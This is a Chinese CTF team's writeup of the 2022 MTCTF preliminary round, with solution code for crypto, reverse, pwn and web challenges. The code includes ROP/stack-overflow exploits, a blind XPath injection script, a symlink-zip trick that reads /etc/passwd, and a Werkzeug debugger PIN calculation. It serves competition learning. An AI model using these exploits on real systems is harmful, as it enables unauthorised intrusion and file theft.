# 2022 美团MTCTF初赛 writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/57358.html
> ID: 57358

点击蓝字，关注我们吧！

Arr3stY0u头

推荐pwn手们学习下pwncli的食用芝士，干净又卫生，写出来的exp比pwntools简洁不老少。https://github.com/RoderickChan/pwncli

招野生web师傅(大二及以下，Java/Python/NodeJs，考核通过可获书籍一本，书籍自选)。

招野生pwn师傅(大二及以下，考核通过可获pwncli作者roderick签名书籍一本，书籍自选)

招野生crypto师傅(大二及以下，数论/群论/格，最好会sage，考核通过可获书籍一本，书籍自选)

招野生SRC师傅(补天专属/企业SRC/众测，考核通过可获书籍一本，书籍自选)

招新&合作联系方式在文末；部分题目附件下载地址请后台回复：mtctf2022

MISC

CyberSpace：

先选择最小的数使其相等，然后分成两部分依次加各部分最小的次数，不会写脚本只能手搓

写个代码解一下就能得到 flag

b= [32 , 38, 27 , 33 , 53 , 30 , 35 , 32 ,32 , 31 , 44 , 31 , 40 , 46 , 25 , 50 , 41 , 44 , 55]

flag=”

for i in range(len(b)):

 flag+=chr(b[i]+70)

print(flag)

#flag{different_xor}

CRYPTO

strange_rsa1：

将 n 也变成小数的形式，n/gift 就约等于 q**2，然后开方在附近搜索 q，之后解 RSA 即可

n = 

1085251670480696185881759768678465632475926812796997649358685718055379954

6624462103913858473496818696201515406983422891322398284055862636990369785

6981515674800664445719963249384904839446749699482532818680540192673814671

5820329055733811884209972318421449890274001066247441467392386878183120129

20530048166672413

c = 

2397039756048232641854450089598256479468105533338518682968670780232292334

5863102521635786012870368948010933275558746273559080917607938457905967618

7771244287110980875259673479232093471909565125203508067664161083248956602

4336466193680162788257795178456958970794396600929575831696736865051255892

3594173887431924

gift = 

0.98787132100571390232983890257676523085030139619192824401690536524885652

0696332072123473648091143791837320129959007867874213673629034957871918764

5145615363088975706222696090029443619975380433122746296316430693294386663

4902218917872921129649895018564353897251496107245851561546885150079838465

99924478524442938

from Crypto.Util.number import *

n=RealField(prec=512*2)(n)

p1=n/gift

print(int(p1))

from gmpy2 import *

p=iroot(int(p1),2)[0]

print(p)

p=1048129736947767868864747342626440475167260924133296899231005859892212

0259940804922095197051670288498112926299671514217457279033970326518832408

003060034368

import sympy

from Crypto.Util.number import *

import gmpy2

floating_rng=500000

for i in range(p-floating_rng, p+floating_rng):

 q = divmod(n,i)

 if q[1]==0:

 print(“p 等于：”,i)

p=1048129736947767868864747342626440475167260924133296899231005859892212

0259940804922095197051670288498112926299671514217457279033970326518832408

003060034369

q=n//p

d=invert(65537,(p-1)*(q-1))

m=pow(c,d,n)

print(long_to_bytes(m))

#flag{a5537b232c1ab750e0db61ec352504a301b7b212}

PWN

smtp：

协议逆向，可知 sender_worker 有栈溢出

#!/usr/bin/env python3

from re import search

from pwncli import *

cli_script()

io = gift[“io”]

elf = gift[“elf”]

libc = gift.libc

filename = gift.filename # current filename

is_debug = gift.debug # is debug or not 

is_remote = gift.remote # is remote or not

gdb_pid = gift.gdb_pid # gdb pid if debug

if gift.remote:

 libc = ELF(“./libc-2.31.so”)

 gift[“libc”] = libc

p = remote(‘127.0.0.1’,9999)

p.sendafter(‘220 SMTP tsmtpn’,’HELOfxxk’)

p.sendafter(‘250 Okn’,”MAIL FROM:
cat flag >&5×00″)

p.sendafter(“250 Okn”,b”RCPT TO:” + flat({

 0x100:

 [

 0x804d1d0,

 ‘a’*0xc,

 elf.plt.popen,

 ‘dead’,

 0x804d140,

 elf.search(b’rx00′).__next__()

 ] },length=0x200))

p.sendafter(‘250 Okn’,’DATA’)

p.sendafter(“.<CR><LF>n”,b”.rn” + b”fxxk”)

p.interactive()

p.close()

note：

菜单的逻辑，但是是栈溢出。利用 magic_gadget:
add [rbp-3Dh],ebx 即可。

#!/usr/bin/env python3

from pwncli import *

cli_script()

io:
tube = gift[“io”]

elf:
ELF = gift[“elf”]

libc:
ELF = gift.libc

filename = gift.filename # current filename

is_debug = gift.debug # is debug or not 

is_remote = gift.remote # is remote or not

gdb_pid = gift.gdb_pid # gdb pid if debug

context.arch = ‘amd64’

if gift.remote:

 libc = ELF(“./libc-2.31.so”)

 gift[“libc”] = libc

def cmd(idx):

 sla(‘leave’,str(idx))

#0 ~ 0x1ff

def add(size,cont):

 cmd(1)

 sla(‘Size:’,str(size))

 sla(‘Content:’,str(cont))

def show(idx):

 cmd(2)

 sla(‘Index:’,str(idx))

def edit(idx,cont):

 cmd(3)

 sla(‘Index:’,str(idx))

 sa(‘Content:’,(cont))

def free(idx):

 cmd(4)

 sla(‘Index:’,str(idx))

gdb.attach(io,’b *0x401579′)

sleep(1)

CurrentGadgets.set_find_area(1,0)

edit(-4,flat({

 8:[

 CurrentGadgets.write_by_magic(elf.bss(0x100),0,u32_ex(‘sh’)),

 CurrentGadgets.write_by_magic(elf.got.puts,libc.sym.puts,libc.sym.system),

 CurrentGadgets.pop_rdi_ret(),

 elf.bss(0x100),

 CurrentGadgets.ret(),

 elf.plt.puts

 ]

}))

io.interactive()

捉迷藏：

简单的利用一下 angr 就行

import angr

import sys

proj = angr.Project(“pwn”, auto_load_libs=False)

state = proj.factory.blank_state(addr=0x4076BD)

simu = proj.factory.simgr(state)

simu.explore(find=0x4079C6, avoid=0x407A43)

if simu.found:

 print(“find!”)

 solution = simu.found[0]

 key = solution.posix.dumps(sys.stdin.fileno())

 print(key)

#get : 

‘<x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00

x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x

00′

#!/usr/bin/env python3

from pwncli import *

cli_script()

io = gift[“io”]

elf = gift[“elf”]

libc = gift.libc

filename = gift.filename # current filename

is_debug = gift.debug # is debug or not 

is_remote = gift.remote # is remote or not

gdb_pid = gift.gdb_pid # gdb pid if debug

sa(‘sbAmJLMLWm:’,”a “*8)

sa(‘HuEqdjYtuWo:’,’a’*0x33)

#sa(‘tfAxpqDQuTCyJw:’,’a’*8)

sa(‘hbsoMdIRWpYRqvfClb:’,’a’*0x35)

sa(‘tfAxpqDQuTCyJw:’,’a’*0x22)

sa(‘UTxqmFvmLy:’,’a ‘*3 + ‘9254 ‘ + ‘0 ‘ + ‘a ‘*3)

sa(‘LLQPyLAOGJbnm:’,'<x00x00x00x00x00x00x00x00x00x00x00x00x00x00x0

0x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00

x00x00x00x00x00x00′)

sa(‘gRGKqIlcuj:’,flat(

 {

 0xf + 8:[0x401334]

 },length=0x37

))

io.interactive()

ret2libc_aarch64：

正如题目字面意思，ret2libc，不过是 aarch64

#!/usr/bin/env python3

from pwncli import *

cli_script()

io: tube = gift.io

elf: ELF = gift.elf

libc: ELF = gift.libc

def leak(addr: int):

 sla(“>”, “1”)

 sa(“sensible>>n”, p64_ex(addr))

 return rl()

def pwn(data):

 sla(“>”, “2”)

 sla(“sensible>>n”, data)

msg = leak(elf.got.read)

read_addr = (0x4000 << 24) + u64_ex(msg[:-1])

log_address(“read_addr”, read_addr)

lb = read_addr – 0x00000000000c3b40

# 0x00128e80 binsh

# 0x0000000000063e5c: ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret; 

# 0000000000040578 system

log_address(“target gadget”, lb + 0x63e5c)

data = flat({

 136: [

 lb + 0x63e5c,

 [lb + 0x000000000040578] * 5,

 lb + 0x00128e80,

 [lb + 0x000000000040578] * 5

 ]

})

pwn(data)

ia()

REVERSE

small：

以二进制文件形式，在 ida 中打开

在适当的地址处，按 c 转成汇编代码，分析出是 TEA 加密，delta 和密钥均已知

在字符串”good”后找到密文

解密 TEA 即可得到 flag

#include <stdio.h>

#include <stdint.h>

//加密函数

void encrypt(unsigned int num_rounds, uint32_t* v, uint32_t* k) {

uint32_t v0 = v[0], v1 = v[1], sum = 0, i;

uint32_t delta = 0x67452301;

uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];

for (i = 0; i < num_rounds; i++) {

sum += delta;

v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);

v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);

}

v[0] = v0; v[1] = v1;

}

//解密函数

void decrypt(unsigned int num_rounds, uint32_t* v, uint32_t* k) {

uint32_t v0 = v[0], v1 = v[1], i;

uint32_t delta = 0x67452301,sum = delta*num_rounds;

uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];

for (i = 0; i<num_rounds; i++) {

v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);

v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);

sum -= delta;

}

v[0] = v0; v[1] = v1;

}

//打印数据 hex_or_chr: 1-hex 0-chr

void dump_data(uint32_t * v,int n,bool hex_or_chr)

{

if(hex_or_chr)

{

for(int i=0;i<n;i++)

{

printf(“0x%x,”,v[i]);

} }

else

{

for (int i = 0; i < n; i++)

{

for (int j = 0; j < sizeof(uint32_t)/sizeof(uint8_t); j++)

{

printf(“%c”, (v[i] >> (j * 8)) & 0xFF);

} } }

printf(“n”);

return;

}

int main()

{

// v 为要加解密的数据

uint32_t v[] = 

{ 0xde087143,0xc4f91bd2,0xdaf6dadc,0x6d9ed54c,0x75eb4ee7,0x5d1ddc04,0x511b0fd9,0

x51dc88fb };

// k 为加解密密钥，4 个 32 位无符号整数，密钥长度为 128 位

uint32_t k[4] = { 0x01,0x23,0x45,0x67 };

// num_rounds，建议取值为 32

unsigned int r = 35;

int n = sizeof(v) / sizeof(uint32_t);

/*

printf(“加密前明文数据：”);

dump_data(v,n,1);

for(int i=0;i<n/2;i++)

{

encrypt(r,&v[i*2], k);

}

printf(“加密后密文数据：”);

dump_data(v,n,1);

 */

for(int i=0;i<n/2;i++)

{

decrypt(r,&v[i*2], k);

}

printf(“解密后明文数据：”);

dump_data(v,n,1);

printf(“解密后明文字符：”);

dump_data(v,n,0);

return 0;

}

// flag{327a6c4304ad5938eaf0efb6cc3e53dc}

WEB

babyjava：

xpath注入

import requests

url = ‘http://eci-2zeck6h5lu4hlf0o62vg.cloudeci1.ichunqiu.com:
8888/hello’

head = {

 “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 

(KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36″,

 “Content-Type”: “application/x-www-form-urlencoded”

}

strs = ‘}_{-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’

flag = ”

for i in range(1, 100):

 for j in strs:

 payload_1 = { # root 

 “xpath”:”admin’ or substring(name(/*[1]), {}, 1)='{}”.format(i,j)

 }

 payload_2 = { # user

 “xpath”:”admin’or substring(name(/root/*[1]), {}, 1)='{}”.format(i,j)

 }

 payload_3 = { # username

 “xpath”:”admin’or substring(name(/root/user/*[2]), {}, 1)='{}”.format(i,j)

 }

 payload_4 = { # username

 “xpath”:”admin’or substring(name(/root/user/*[1]), {}, 1)='{}”.format(i,j)

 }

 payload_7 = { # flag

 “xpath”:”1′ or substring(/root/user/username[2]/text(),{},1)='{}”.format(i,j)

 }

 r = requests.post(url=url, headers=head, data=payload_7)

 

 if “This information is not available” not in r.text:

 flag += j

 print(flag)

 break

 if “This information is not available” in r.text:

 break

print(flag)

OnlineUnzip：

软链接任意读文件

flag.sh /etc/passwd

#!/usr/bin/env bash

rm flag

rm flag.zip

ln -s $1 flag

zip –symlinks flag.zip flag

这里可以将目录列出

发现 ffffl111l1a44a4ggg

读取发现无权限，python3.8，所以可以算 pin 码

算pin

import hashlib

from itertools import chain

probably_public_bits = [

 ‘ctf’# /etc/passwd

 ‘flask.app’,# 默认值

 ‘Flask’,# 默认值

 ‘/usr/local/lib/python3.8/site-packages/flask/app.py’ # 报错得到

]

private_bits = [

 ‘95529894978’,# /sys/class/net/eth0/address 16 进 制 转 10 进 制 

00:16:3e:06:84:42

 #/etc/machine-id + /proc/self/cgroup

 

’96cec10d3d9307792745ec3b85c896201d32e75cee611384a0f09556e07ef291176ed1454

d035521b7e624689d20583d’

]

h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):

 if not bit:

 continue

 if isinstance(bit, str):

 bit = bit.encode(‘utf-8’)

 h.update(bit)

h.update(b’cookiesalt’)

cookie_name = ‘__wzd’ + h.hexdigest()[:20]

num = None

if num is None:

 h.update(b’pinsalt’)

 num = (‘%09d’ % int(h.hexdigest(), 16))[:9]

rv =None

if rv is None:

 for group_size in 5, 4, 3:

 if len(num) % group_size == 0:

 rv = ‘-‘.join(num[x:x + group_size].rjust(group_size, ‘0’)

 for x in range(0, len(num), group_size))

 break

 else:

 rv = num

print(rv)

读取flag

Arr3stY0u尾

山海关安全团队官网：

https://www.shg-sec.com/

招新&合作联系：2944508194@qq.com

简介：

    山海关安全团队是一支专注网络安全的实战型团队，总人数已达20余人，团队大部分成员来自国内高校，企事业单位。

    Arr3stY0u是山海关安全团队旗下的CTF战队，积极参与国内外各大小型CTF竞赛，持续招收Web, Crypto, Misc, Pwn, Blockchain选手。

部分荣誉：

2021.10 某基金诈骗案调查技术支持（省督，金额￥2000000000）

2021.11 深信服某产品漏洞报送证书

2022.04 第二届网刃杯 12th

2022.07 首届数字空间安全攻防大赛DSCTF 初赛 6th

2022.08 第六届强网杯 线上&线下 三等奖

2022.09 2022 羊城杯 三等奖

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663508958.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/10-1663508958.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663508959.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/6-1663508963.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/9-1663508965.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/9-1663508966.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1663508968.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1663508969.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/1-1663508971.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1663508971.png)